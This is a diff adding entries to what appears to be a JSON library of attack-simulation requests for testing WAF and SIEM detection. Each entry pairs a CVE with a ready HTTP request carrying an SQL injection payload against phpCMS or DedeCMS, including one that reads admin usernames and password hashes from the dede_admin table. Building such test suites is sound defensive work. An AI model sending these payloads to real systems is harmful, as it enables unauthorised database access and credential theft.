@@ -427775,6 +427775,153 @@
     "visible": true
   },
   {
+    "name": "CVE-2020-22203 - phpCMS 2008 SP4 SQL Injection",
+    "displayName": "CVE-2020-22203 - phpCMS 2008 SP4 SQL Injection",
+    "type": "webRequest",
+    "description": "phpCMS 2008 SP4 is vulnerable to SQL injection in the genre parameter of /yp/job.php (action=applylist); the parameter is concatenated into a SQL query with no filtering. The request sends a time-based SQL injection payload (AND SLEEP(5)) in genre. Method is GET per the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/blindkey/cve_like/issues/6 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-22203 (CVE record)",
+    "value": {
+      "input": "GET /yp/job.php?action=applylist&inputtime=0&station=5&genre=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-22203"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-22203",
+        "link": "https://github.com/blindkey/cve_like/issues/6"
+      },
+      {
+        "title": "cve record for CVE-2020-22203",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2020-22203"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-22199 - phpCMS 2007 SP6 SQL Injection",
+    "displayName": "CVE-2020-22199 - phpCMS 2007 SP6 SQL Injection",
+    "type": "webRequest",
+    "description": "phpCMS 2007 SP6 build 0805 is vulnerable to SQL injection in the digg_mod parameter of /digg/digg_add.php, which is passed into a SQL query (as mod_id) without filtering. The request sends an error-based SQL injection payload (information_schema subquery / CONCAT / FLOOR(RAND())) in digg_mod. Method is GET per the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/blindkey/cve_like/issues/1 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-22199 (CVE record)",
+    "value": {
+      "input": "GET /digg/digg_add.php?id=1&con=2&digg_mod=digg_data%20WHERE%201%3D1%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*)%2cCONCAT(version()%2cFLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-22199"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-22199",
+        "link": "https://github.com/blindkey/cve_like/issues/1"
+      },
+      {
+        "title": "cve record for CVE-2020-22199",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2020-22199"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-22198 - DedeCMS 5.7 SQL Injection",
+    "displayName": "CVE-2020-22198 - DedeCMS 5.7 SQL Injection",
+    "type": "webRequest",
+    "description": "DedeCMS 5.7 is vulnerable to SQL injection in the mdescription parameter of member/ajax_membergroup.php (action=despost); the value is written into a SQL statement without filtering. The request sends a subquery SQL injection payload reading the dede_admin table in mdescription. Method is GET per the PoC. The PoC install folder was /ccpAdvert/; the canonical path /member/ajax_membergroup.php is used. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/blindkey/DedeCMSv5/issues/1 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-22198 (CVE record)",
+    "value": {
+      "input": "GET /member/ajax_membergroup.php?action=despost&mdescription=1%27%2C%60description%60%3D(SELECT%20CONCAT(userid%2C0x7e%2Cpwd)%20FROM%20dede_admin)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-22198"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-22198",
+        "link": "https://github.com/blindkey/DedeCMSv5/issues/1"
+      },
+      {
+        "title": "cve record for CVE-2020-22198",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2020-22198"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-4632 - itsourcecode Online Enrollment System SQL Injection",
     "displayName": "CVE-2026-4632 - itsourcecode Online Enrollment System SQL Injection",
     "description": "itsourcecode Online Enrollment System 1.0 is vulnerable to SQL injection via the 'Name' argument of the add-user handler at /sms/user/index.php?view=add. The request sends a boolean SQL injection payload in Name. No vendor WAF rule found; built from the VulDB entry. METHOD INFERRED: POST (add-form action) per spec guidance, as the PoC request body was not reachable.\n\nReferences used to recreate this request:\n- https://github.com/chuxina7-aiguo/CVE1/issues/1 (PoC)\n- https://vuldb.com/?id.352499 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4632 (CVE record)",
